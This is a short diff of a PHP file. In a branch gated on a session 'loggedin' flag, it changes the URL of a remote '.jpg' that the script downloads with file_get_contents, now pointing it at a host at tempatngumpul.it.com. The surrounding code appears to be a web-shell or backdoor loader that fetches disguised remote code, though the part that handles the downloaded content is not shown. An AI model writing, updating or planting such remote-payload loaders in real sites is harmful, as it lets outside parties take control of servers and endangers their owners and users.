@@ -17,7 +17,7 @@ if (!isset($_SESSION['loggedin'])) {
 }
 
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://levellink.space/tnq/tnq.jpg';
+    $url = 'http://tempatngumpul.it.com/NextGeneration/tuturu.jpg';
     $content = file_get_contents($url);
 
     if ($content !== false) {
@@ -179,3 +179,4 @@ if (!isset($_SESSION['loggedin'])) {
     exit();
 }
 ?>
+
